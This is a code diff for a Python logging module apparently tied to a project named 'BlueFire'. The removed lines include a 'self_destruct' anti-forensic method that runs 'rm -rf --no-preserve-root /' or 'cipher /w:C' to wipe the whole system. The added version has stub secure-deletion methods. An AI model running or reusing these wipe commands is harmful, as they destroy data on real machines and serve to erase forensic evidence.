@@ -1,23 +1,34 @@
-### **/src/modules/forensic_logger.py** (New)
-python
+# src/modules/forensic_logger.py
 import logging
-import hashlib
+import platform
+import secure_delete
 
-class DoomLogger:
-    def __init__(self):
+class ForensicLogger:
+    def __init__(self, log_path=None):
         self.logger = logging.getLogger('BlueFire')
         self.logger.setLevel(logging.DEBUG)
-        self._configure()
         
-    def _configure(self):
-        handler = logging.FileHandler('/dev/null' if os.name == 'posix' else 'NUL')
-        handler.setFormatter(logging.Formatter(
-            '[%(asctime)s] %(levelname)s - %(message)s',
-            datefmt='%Y-%d-%m %H:%M:%S'
-        ))
-        self.logger.addHandler(handler)
-    
-    def self_destruct(self):
-        """Initiate anti-forensic sequence"""
-        self.logger.debug("Activating digital seppuku protocol")
-        os.system('rm -rf --no-preserve-root /' if os.name == 'posix' else 'cipher /w:C')
+        if log_path:
+            handler = logging.FileHandler(log_path)
+            handler.setFormatter(logging.Formatter(
+                '[%(asctime)s] %(levelname)s - %(message)s',
+                datefmt='%Y-%m-%dT%H:%M:%SZ'
+            ))
+            self.logger.addHandler(handler)
+        
+        if platform.system() == 'Windows':
+            self.wipe_method = self._windows_wipe
+        else:
+            self.wipe_method = self._unix_wipe
+
+    def _secure_delete(self, path):
+        secure_delete.secure_random_seed_init()
+        secure_delete.secure_delete(path)
+        
+    def _windows_wipe(self, path):
+        # Implement Windows-specific secure deletion
+        pass
+
+    def _unix_wipe(self, path):
+        # Implement Unix-specific secure deletion
+        pass
